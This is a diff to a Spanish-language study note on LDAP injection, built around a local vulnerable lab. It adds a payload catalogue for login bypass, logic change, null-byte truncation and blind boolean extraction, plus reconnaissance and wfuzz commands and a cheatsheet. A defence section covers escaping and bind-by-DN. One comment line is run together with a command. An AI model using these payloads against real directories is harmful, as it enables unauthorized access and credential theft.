@@ -3,14 +3,24 @@ aliases:
   - LDAP Injection
   - Inyección LDAP
 tags:
-  - hacking/explotacion
-  - hacking/web
+  - sec/web
+  - sec/web/injection
+  - sec/web/auth
   - hacking/laboratorios
-  - hacking/herramientas
   - scripting/python
   - linux/comandos
   - redes/protocolos
-estado: 🟢 Terminado
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[SQL Injection]]"
+  - "[[Inyección NoSQL]]"
+  - "[[Gestión de Autenticación]]"
+  - "[[Nmap Guía Completa]]"
+  - "[[Reconocimiento y Escaneo de Redes y Web]]"
+fuente: "https://portswigger.net/web-security/ldap-injection"
 ---
 # Inyecciones LDAP (Protocolo Ligero de Acceso a Directorios)
 
@@ -34,6 +44,70 @@ Para evitar las inyecciones LDAP, las aplicaciones web que interactúan con un s
 
 > [!tip] Medidas de Prevención Adicionales
 > Además de la validación de entrada, es crucial implementar el principio de mínimos privilegios para las cuentas de servicio que interactúan con el servidor LDAP. También se recomienda el uso de sentencias preparadas o APIs de acceso a directorios que manejen automáticamente el escape de caracteres, similar a cómo se previenen las inyecciones SQL. El monitoreo regular de los logs del servidor LDAP puede ayudar a detectar actividades sospechosas.
+
+## Mecánica: cómo una app construye consultas LDAP
+
+LDAP (RFC 4515/4512) trabaja con **DNs** (*Distinguished Name*, la ruta de una entrada) y **filtros de búsqueda** en notación de prefijo polaca. Una app de login típica hace un *search* con filtro construido por concatenación y luego un *bind* (autenticación):
+
+```java
+// ❌ La app concatena el input directamente en el filtro
+String filter = "(&(uid=" + user + ")(userPassword=" + pass + "))";
+ctx.search("ou=people,dc=example,dc=org", filter, controls);
+
+// ✅ Filtro parametrizado (escape RFC 4515) — igual que prepared statements
+String filter = "(&(uid={0})(userPassword={1}))";
+ctx.search(base, filter.replace("{0}", esc(user)).replace("{1}", esc(pass)), controls);
+```
+
+### Sintaxis de filtros (RFC 4515)
+
+| Elemento | Sintaxis | Ejemplo |
+|---|---|---|
+| Atributo igualdad | `(atributo=valor)` | `(uid=admin)` |
+| Y / O / No | `(&...)` `(|...)` `(!...)` | `(&(uid=a)(mail=*@x.com))` |
+| Comodín | `*` (substring) | `(uid=a*)` → usuarios que empiezan por `a` |
+| Subcadena | `(attr=a*b*c)` | `(&(cn=J*)(sn=*son))` |
+| Escape de especial | `\2a \28 \29 \5c \00` | `*` → `\2a` (evita el wildcard inyectado) |
+| Aproximación / rangos | `(attr~=v)` `(attr>=v)` | rara vez usadas por apps |
+
+**Caracteres especiales a escapar**: `* ( ) \ NUL` — un `*` sin escapar convierte una comparación en **búsqueda de subcadena** (el wildcard del lab), y `)`/`(` rompen la estructura del filtro para **cambiar la lógica** (OR implícito, bypass de AND).
+
+### Los tres patrones de inyección
+
+| Patrón | Payload | Efecto |
+|---|---|---|
+| **Bypass de autenticación** | usuario `admin`, pass `*` → `(uid=admin)(userPassword=*)` | Cualquier pass que *exista* para el usuario funciona |
+| **Cambio de lógica** | `admin)(|(uid=*` → `(&(uid=admin)(|(uid=*)(uid=*))` | Rompe el AND: la condición se vuelve tautología |
+| **Null byte de truncado** | `admin%00` | Corta la consulta en C-based parsers: el resto (pass check) se ignora |
+
+> [!info] Oracle ciego (blind LDAP)
+> Si la app no devuelve resultados, pero distingue "login OK" vs "fallo" (aquí: redirect `301` vs `200`), tienes un **oráculo booleano**: `(userPassword=a*)` → ¿existe alguna contraseña que empieza por `a`? Carácter a carácter reconstruyes usuarios, contraseñas y atributos — exactamente el mismo principio que el boolean blind de [[SQL Injection]].
+
+### Reconocimiento previo del directorio
+
+Antes de inyectar, mapea el servidor LDAP real (si tienes acceso legítimo o desde dentro):
+
+```bash
+# Nmap con scripts LDAP (revela naming contexts, root DSE, tipos soportados)
+nmap --script ldap* -p389,636 target
+# Búsqueda anónima de la base\ldapsearch -x -H ldap://target -b '' '(objectClass=*)' namingContexts
+# Enumeración con credenciales (como en los labs)
+ldapsearch -x -H ldap://localhost -b dc=example,dc=org \
+  -D "cn=admin,dc=example,dc=org" -w admin '(objectClass=*)'
+```
+
+Ver [[Nmap Guía Completa]] para los scripts `ldap*` y [[Reconocimiento y Escaneo de Redes y Web]] para la fase de reconocimiento en general. Los nombres de atributos descubiertos (`cn`, `uid`, `mail`, `description`, `employeeNumber`) alimentan el fuzzing de la práctica de abajo.
+
+### Catálogo de payloads
+
+| Contexto | Payload |
+|---|---|
+| Login (pass) | `*`, `a*`, `*)(uid=*))(|(uid=*` |
+| Login (user) | `admin)(|(password=*`, `*)(objectClass=*` |
+| Truncado | `admin%00`, `admin\00` |
+| Búsqueda de directorio | `*`, `objectClass=*`, `(&(cn=*))` |
+| Exfiltración por atributo | `admin)(description=*` → ¿contiene? oracle booleano |
+| Extractor ciego por charset | `(uid=adm\69)`... ofuscación, o `a*` incremental (el script Python de abajo) |
 
 También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades del servidor LDAP para detectar posibles inyecciones.
 
@@ -253,3 +327,94 @@ wfuzz --hc=200 -c -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt -d
 ![[Pasted image 20260227125921.png]]
 
 Podemos ver cómo hemos filtrado por varios atributos, que son muchos. Esto nos permite descubrir qué atributos son reconocidos por el servidor LDAP, lo cual es crucial para futuras inyecciones y enumeraciones de información.
+
+## Defensa
+
+### 1. Escape de filtros RFC 4515 (equivalente al prepared statement)
+
+```python
+# ❌ Concatenación
+filt = f"(&(uid={user})(userPassword={pwd}))"
+
+# ✅ Escape de los 5 caracteres especiales
+LDAP_SPECIAL = {"\\": r"\5c", "*": r"\2a", "(": r"\28", ")": r"\29", "\x00": r"\00"}
+def ldap_escape(value: str) -> str:
+    return "".join(LDAP_SPECIAL.get(ch, ch) for ch in value)
+
+filt = f"(&(uid={ldap_escape(user)})(userPassword={ldap_escape(pwd)}))"
+```
+
+```java
+// ✅ Spring LDAP: filtro parametrizado de fábrica
+Filter filter = new Filter("(&(uid={0})(userPassword={1}))", user, pwd);
+// usa ldap_encode_filter por dentro
+```
+
+### 2. No buscar la contraseña: hacer bind por DN
+
+El patrón seguro es: buscar el `dn` del usuario con un filtro **solo de uid** (escapado), y luego hacer **bind** con ese DN y la contraseña del cliente. Así la contraseña nunca se concatena en un filtro y el motor LDAP la valida:
+
+```python
+# ✅ Búsqueda + bind (patrón canónico de autenticación LDAP)
+dn = ldap_search(f"(&(objectClass=person)(uid={ldap_escape(user)}))")  # dn único
+if dn and ldap_bind(dn, password):   # el servidor valida la credencial
+    login(user)
+else:
+    generic_error()                  # mismo mensaje y tiempo siempre
+```
+
+### 3. Principio de mínimo privilegio y hardening del servidor
+
+- Cuenta de servicio de la app con permisos de **solo búsqueda** sobre las OUs necesarias (no admin del directorio).
+- Deshabilitar búsquedas anónimas y bind sin credenciales en el servidor OpenLDAP (`olcAccess`, `disallow bind_anon`).
+- Rate limiting y logs del proxy/app: los ataques de wildcard/booleano generan patrones de búsqueda anómalos.
+- Comparación de credenciales en tiempo constante en la app si se compara hash localmente.
+
+## Errores comunes
+
+**Atacante:**
+- Probar solo bypass de login y olvidar la **enumeración de atributos** (wfuzz con la wordlist de SecLists) — es donde sale el dato sensible (`description`, `employeeNumber`).
+- No confirmar el oráculo: mide primero qué distingue éxito/fallo (aquí el `301`), si no, cada resultado es ruido.
+- Ignorar el null byte: parsers C antiguos lo siguen truncando.
+- Fuzzear contra un servidor LDAP interno sin haber mapeado la base DN con `nmap --script ldap*`.
+
+**Defensor:**
+- Concatenar input en el filtro "porque LDAP es interno" (el directorio suele contener la credencial maestra de la organización).
+- Filtrar solo `*` y dejar `(`/`)` (la lógica se rompe igual).
+- Hacer bind con la contraseña como parte del filtro en vez de bind por DN.
+- Cuenta de servicio LDAP con privilegios de admin del directorio.
+
+## Cheatsheet
+
+```
+# Mapeo del directorio
+nmap --script ldap* -p389,636 target
+ldapsearch -x -H ldap://target -b '' '(objectClass=*)' namingContexts
+ldapsearch -x -H ldap://target -b dc=example,dc=org -D admin -w admin '(objectClass=*)'
+
+# Bypass de login
+user: admin        pass: *
+user: admin)(|(uid=*   pass: x
+user: admin%00     pass: x
+
+# Oracle booleano (301 = condición verdadera en el lab)
+user_id=admin)(description=a*&password=*&login=1
+
+# Enumeración incremental de usuarios (script de arriba)
+user_id=<parcial>*  -> carácter que devuelve 301 se agrega al parcial
+
+# Fuzzing de atributos
+wfuzz --hc=200 -c -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt \
+  -d 'user_id=admin)(FUZZ=*))%00&password=*&login=1&submit=Submit' -u http://target/
+
+# Evasión de escapes
+* -> \2a     ( -> \28     ) -> \29     \\ -> \5c
+```
+
+## Laboratorios y referencias
+
+- Lab local: LDAP-Injection-Vuln-App — https://github.com/motikan2010/LDAP-Injection-Vuln-App
+- PortSwigger Academy — LDAP injection: https://portswigger.net/web-security/ldap-injection
+- OWASP LDAP Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
+- RFC 4515 (Search Filter Syntax): https://datatracker.ietf.org/doc/html/rfc4515
+- Related internals: [[SQL Injection]] · [[Inyección NoSQL]] · [[Gestión de Autenticación]] · [[Nmap Guía Completa]] · [[Reconocimiento y Escaneo de Redes y Web]]
